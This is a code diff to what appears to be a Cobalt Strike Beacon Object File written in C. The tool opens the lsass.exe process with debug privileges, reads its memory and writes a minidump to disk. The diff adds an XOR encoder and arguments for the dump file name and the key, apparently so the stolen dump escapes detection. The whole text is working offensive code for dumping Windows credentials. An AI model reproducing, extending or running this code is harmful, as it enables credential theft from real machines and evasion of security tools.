@@ -538,22 +538,11 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
 }
 
 
-void to_lowercase(char *str) {
-    while (*str) {
-        if (*str >= 'A' && *str <= 'Z') {
-            *str = *str + ('a' - 'A');
-        }
-        str++;
-    }
-}
-
-
 HANDLE GetProcessByName(const char* proc_name) {
     HANDLE aux_handle = NULL;
     NTSTATUS status;
     while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
-        to_lowercase(current_proc_name);
         if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
             return aux_handle;
         }
@@ -777,7 +766,7 @@ MemFile* ReadMemReg(HANDLE hProcess, int* memfile_countOutput){
 ModuleInformation* GetModuleInfo(HANDLE* hProcessOutput, int* module_counterOutput){
     // Process handle
     EnableDebugPrivileges();
-    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
+    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
     *hProcessOutput = hProcess;
     
@@ -1012,21 +1001,33 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
 }
 
 
+char* encode_bytes(char* dump_bytes, int dump_len, char* key_xor, int key_len) {
+    // char* encoded_bytes = (char*)malloc(dump_len);
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    char* encoded_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dump_len);
+    for (int i = 0; i < dump_len; i++) {
+        encoded_bytes[i] = dump_bytes[i] ^ key_xor[i % key_len];
+    }
+    return encoded_bytes;
+}
+
+
 void go(char *args, int length) {
-    // Get first argument value
-    //      - disk:        09000000050000006469736b00
-    //      - knowndlls:   0e0000000a0000006b6e6f776e646c6c7300
-    //      - debugproc:   0e0000000a000000646562756770726f6300    
     datap  parser;
     char * option;
+    char * dump_fname;
+    char * key_xor;
     BeaconDataParse(&parser, args, length);
     option = BeaconDataExtract(&parser, NULL);
+    dump_fname = BeaconDataExtract(&parser, NULL);
+    key_xor = BeaconDataExtract(&parser, NULL);
     if (option){
         ReplaceLibrary(option);
     }
 
-    // File names
-    char* dump_fname = "native.dmp";    
+    if (dump_fname == NULL){
+        dump_fname = "native.dmp";
+    }
 
     // OS Information (Lock)
     OSVERSIONINFOW osvi = GetOSInfo();
@@ -1043,5 +1044,9 @@ void go(char *args, int length) {
     // Create Minidump
     int dump_len = NULL;
     char* dump_file_bytes = get_dump_bytearr(osvi, moduleInformationList, moduleInformationList_len, memfile_list, memfile_count, &dump_len);
+    if (key_xor != NULL) {
+        int key_len = MyStrLen(key_xor);
+        dump_file_bytes = encode_bytes(dump_file_bytes, dump_len, (char*)key_xor, key_len);
+    }
     write_string_to_file(dump_fname, dump_file_bytes, dump_len, TRUE);
 }
